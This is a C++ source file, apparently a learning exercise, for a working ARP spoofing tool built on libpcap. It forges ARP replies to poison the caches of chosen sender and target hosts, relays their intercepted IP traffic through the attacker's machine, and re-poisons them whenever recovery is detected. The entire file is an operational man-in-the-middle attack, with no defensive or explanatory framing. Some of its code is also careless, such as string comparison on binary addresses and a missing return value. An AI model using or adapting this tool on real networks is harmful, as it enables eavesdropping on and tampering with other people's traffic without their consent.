#include <bits/stdc++.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <ctime>
#define ETHHDRLEN 14
#define ARPHDRLEN 28

using namespace std;

char *interface;

uint8_t BROADCAST[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
uint8_t UNKNOWN[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

uint8_t attacker_ip[4];
uint8_t attacker_mac[6];

typedef struct eth_header {
	uint8_t dst_mac[6];
	uint8_t src_mac[6];
	uint8_t type[2];
} eth_header;

typedef struct arp_header {
	uint8_t hardware_type[2];
	uint8_t protocol_type[2];
	uint8_t hardware_size;
	uint8_t protocol_size;
	uint8_t opcode[2];
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
} arp_header;

class Session {
public:
    uint8_t sender_ip[4];
    uint8_t sender_mac[6];
    uint8_t target_ip[4];
    uint8_t target_mac[6];

    Session(char *_sender_ip, char *_target_ip) {
        uint32_t sender_ip_hex = inet_addr(_sender_ip);
        for(int i = 0; i < 4; i++) sender_ip[i] = *((uint8_t *)&sender_ip_hex + i);
        uint32_t target_ip_hex = inet_addr(_target_ip);
        for(int i = 0; i < 4; i++) target_ip[i] = *((uint8_t *)&target_ip_hex + i);
    }
};

int arp_spoofing(Session *s);
void arp_infection(pcap_t *handle, uint8_t *packet, Session *s);
void arp_packet_write(uint8_t *packet, uint8_t *src_mac, uint8_t *dst_mac, uint8_t *sender_mac, uint8_t *sender_ip, uint8_t *target_mac, uint8_t *target_ip, uint32_t opcode);
int arp_packet_send(pcap_t *handle, uint8_t *packet);
void get_mac_with_ip(pcap_t *handle, uint8_t *packet, uint8_t *ip, uint8_t *mac);
int arp_recovery_detection(char *pkt, Session *s, clock_t *timeout_duration);


int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
        printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
        return -1;
    }

    interface = argv[1];
    int session_count = (argc - 2) / 2;

    // get attacker ip, mac address
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(s.ifr_name, interface);
    if(0 == ioctl(fd, SIOCGIFADDR, &s))
        for(int i = 0; i < 4; i++) attacker_ip[i] = s.ifr_addr.sa_data[i+2];
    if(0 == ioctl(fd, SIOCGIFHWADDR, &s))
        for(int i = 0; i < 6; i++) attacker_mac[i] = s.ifr_addr.sa_data[i];
    close(fd);
    //

    vector<thread> t;
    t.reserve(session_count);

    for(int i = 0; i < session_count; i++) {
        t.push_back(thread(arp_spoofing, new Session(argv[i*2+2], argv[i*2+3])));
    }

    for(int i = 0; i < session_count; i++) {
        t[i].join();
    }

    return 0;
}

int arp_spoofing(Session *s) {
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 1, 1000, 0);
    uint8_t packet[ETHHDRLEN+ARPHDRLEN];

    // get sender mac with sender ip
    arp_packet_write(packet, attacker_mac, BROADCAST, attacker_mac, attacker_ip, UNKNOWN, s->sender_ip, 1); // arp request  
    arp_packet_send(handle, packet);
    get_mac_with_ip(handle, packet, s->sender_ip, s->sender_mac);

    memset(packet, 0, ETHHDRLEN+ARPHDRLEN);

    // get target mac with target ip
    arp_packet_write(packet, attacker_mac, BROADCAST, attacker_mac, attacker_ip, UNKNOWN, s->target_ip, 1); // arp request
    arp_packet_send(handle, packet);
    get_mac_with_ip(handle, packet, s->target_ip, s->target_mac);

    printf("Waiting for 10 sec to collect sender mac and target mac...\n");
	usleep(10000000);
    printf("Start arp spoofing\n");
	
    memset(packet, 0, ETHHDRLEN+ARPHDRLEN);

    // arp infection
    arp_infection(handle, packet, s);

    // ip packet relay & arp recovery detection
    clock_t timeout_duration = clock();
    while(true) {
        struct pcap_pkthdr *header;
        const u_char *pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        uint8_t *ptr = (uint8_t *)pkt;

        // ip packet relay
        if(*(ptr+12) == 0x08 && *(ptr+13) == 0x00) {
            if(!strncmp((char *)attacker_mac, (char *)ptr, 6) && !strncmp((char *)s->sender_mac, (char *)ptr+6, 6)) {
                memcpy((char *)ptr, s->target_mac, 6);
                memcpy((char *)ptr+6, attacker_mac, 6);
                if(pcap_sendpacket(handle, ptr, header->len) != 0) {
                    fprintf(stderr,"Error sending the packet: %s\n", pcap_geterr(handle));
                }
            }
        }
        
        // arp recovery detection
        else if(*(ptr+12) == 0x08 && *(ptr+13) == 0x06) {
            if(arp_recovery_detection((char *)pkt, s, &timeout_duration)) {
                arp_infection(handle, packet, s);
            }
        }
    }
}

void arp_packet_write(uint8_t *packet, uint8_t *src_mac, uint8_t *dst_mac, uint8_t *sender_mac, uint8_t *sender_ip, uint8_t *target_mac, uint8_t *target_ip, uint32_t opcode) {
    eth_header eth;
	arp_header arp;

    memcpy(eth.src_mac, src_mac, 6);
    memcpy(eth.dst_mac, dst_mac, 6);
	eth.type[0] = 0x08;
	eth.type[1] = 0x06;
	
	arp.hardware_type[0] = 0x00;
	arp.hardware_type[1] = 0x01;
	arp.protocol_type[0] = 0x08;
	arp.protocol_type[1] = 0x00;
	arp.hardware_size = 6;
	arp.protocol_size = 4;
	arp.opcode[0] = 0x00;
	arp.opcode[1] = opcode;
    memcpy(arp.sender_mac, sender_mac, 6);
    memcpy(arp.sender_ip, sender_ip, 4);
    memcpy(arp.target_mac, target_mac, 6);
    memcpy(arp.target_ip, target_ip, 4);

    memcpy(packet, &eth, ETHHDRLEN);
    memcpy(packet+ETHHDRLEN, &arp, ARPHDRLEN);
}

int arp_packet_send(pcap_t *handle, uint8_t *packet) {
    if(pcap_sendpacket(handle, packet, ETHHDRLEN + ARPHDRLEN) != 0) {
        fprintf(stderr,"Error sending the packet: %s\n", pcap_geterr(handle));
        return -1;
    }
}

void get_mac_with_ip(pcap_t *handle, uint8_t *packet, uint8_t *ip, uint8_t *mac) {
    while(true) {
        struct pcap_pkthdr *header;
        const u_char *pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        uint8_t *ptr = (uint8_t *)pkt;
		
        // check
        if(*(ptr+12) == 0x08 && *(ptr+13) == 0x06 && !strncmp((char *)ip, (char *)ptr+28, 4)) {
            memcpy(mac, ptr+6, 6);
            break;
        }
    }
}

void arp_infection(pcap_t *handle, uint8_t *packet, Session *s) {
    // arp infection to sender
    arp_packet_write(packet, attacker_mac, s->sender_mac, attacker_mac, s->target_ip, s->sender_mac, s->sender_ip, 2); // arp reply
    arp_packet_send(handle, packet);
    memset(packet, 0, ETHHDRLEN+ARPHDRLEN);

    // arp infection to target
    arp_packet_write(packet, attacker_mac, s->target_mac, attacker_mac, s->sender_ip, s->target_mac, s->target_ip, 2); // arp reply
    arp_packet_send(handle, packet);
    memset(packet, 0, ETHHDRLEN+ARPHDRLEN);
}

int arp_recovery_detection(char *pkt, Session *s, clock_t *timeout_duration) {
    // sender unicast
    if(!strncmp(pkt, (char *)attacker_mac, 6) && !strncmp(pkt+6, (char *)s->sender_mac, 6))
        return 1;
    // sender broadcast
    else if(!strncmp(pkt, (char *)BROADCAST, 6) && !strncmp(pkt+6, (char *)s->sender_mac, 6))
        return 1;
    // target unicast
    else if(!strncmp(pkt, (char *)attacker_mac, 6) && !strncmp(pkt+6, (char *)s->target_mac, 6))
        return 1;
    // target broadcast
    else if(!strncmp(pkt, (char *)BROADCAST, 6) && !strncmp(pkt+6, (char *)s->target_mac, 6))
        return 1;
    // timeout
    else if(clock() - *timeout_duration > 10 * 1000) {
        *timeout_duration = clock();
        return 1;
    }
    else return 0;
}